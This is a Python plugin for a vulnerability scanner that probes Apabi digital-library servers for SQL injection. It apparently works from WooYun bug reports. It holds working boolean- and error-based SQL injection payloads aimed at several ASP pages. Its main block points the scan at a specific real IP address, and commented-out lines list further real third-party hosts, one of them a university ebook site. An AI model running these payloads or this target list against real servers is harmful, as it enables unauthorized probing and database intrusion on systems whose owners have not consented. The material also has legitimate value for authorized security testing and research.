#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = apabi_tasi sql injection
#_FileName_ = apabi_sqli.py

def assign(service, arg):
    if service == 'apabi_tasi':
        return True, arg

def audit(arg):
    #No.1 http://www.wooyun.org/bugs/wooyun-2010-0103712
    payload1 = "DLib/List1.asp?lang=gb&act=CategoryBrowse&DocGroupID=2&CategoryTypeID=1%20and%20%1=1&BrowseID=1&BrowseName=%BC%C6%CB%E3%BB%FA%CD%F8%C2%E7"
    payload2 = "DLib/List1.asp?lang=gb&act=CategoryBrowse&DocGroupID=2&CategoryTypeID=1%20and%20%1=2&BrowseID=1&BrowseName=%BC%C6%CB%E3%BB%FA%CD%F8%C2%E7"
    code1, head1, body1, errcode1, final_url1 = curl.curl2(arg + payload1)
    code2, head2, body2, errcode2, final_url2 = curl.curl2(arg + payload2)
    if code1==200 and code2==200 and len(body1)!=len(body2):
        security_hole(arg+payload1)
    #No.2 http://www.wooyun.org/bugs/wooyun-2010-0103581
    payload = "dlib/bbs/bbs_search.asp?lang=gb"
    post = "key=1%27%29%20and%201%3Dconvert%28int%2C%27hen%27%2b%27tai%27%29%20and%20%28%271%27%20like%20%271"
    code, head, body, errcode1, final_url = curl.curl2(arg + payload, post=post)
    if 'hentai' in body:
        security_hole(arg+payload+" && post:"+post)
    #No.3 http://www.wooyun.org/bugs/wooyun-2010-0102763
    #No.4 http://www.wooyun.org/bugs/wooyun-2010-0102829
    #No.5 http://www.wooyun.org/bugs/wooyun-2010-0102760
    #No.6 http://www.wooyun.org/bugs/wooyun-2010-0102822
    payloads = ["dlib/dir.asp?lang=gb&DocID=convert%28int,%27hen%27%2b%27tai%27%29",
                "tree/deeptree.asp?DocGroupID=convert%28int,%27hen%27%2b%27tai%27%29&hide=1&CategoryTypeID=1",
                "dlib/netlinkhandler.asp?lang=gb&DocGroupID=convert%28int,%27hen%27%2b%27tai%27%29&FieldID=convert%28int,%27hen%27%2b%27tai%27%29&FieldName=Creator&FieldType=1&QueryValue=%C1%D6%C9%BD&Repeatable=True",
                "dlib/AddMyFavourite.asp?lang=gb&DocID=convert%28int%2C%27hen%27%2b%27tai%27%29%20--%20hehe",
                ]
    for payload in payloads:
        code, head, body, errcode1, final_url = curl.curl2(arg + payload)
        if 'hentai' in body:
            security_hole(arg+payload)


if __name__ == '__main__':
    from dummy import *
    audit(assign('apabi_tasi', 'http://61.167.120.67:8083/')[1])
    #audit(assign('apabi_tasi', 'http://210.37.2.181/')[1])
    #audit(assign('apabi_tasi', 'http://211.81.174.133:81/')[1])
    #audit(assign('apabi_tasi', 'http://202.117.24.8/')[1])
    #audit(assign('apabi_tasi', 'http://ebook.nwu.edu.cn/')[1])
    #audit(assign('apabi_tasi', 'http://210.37.2.181/')[1])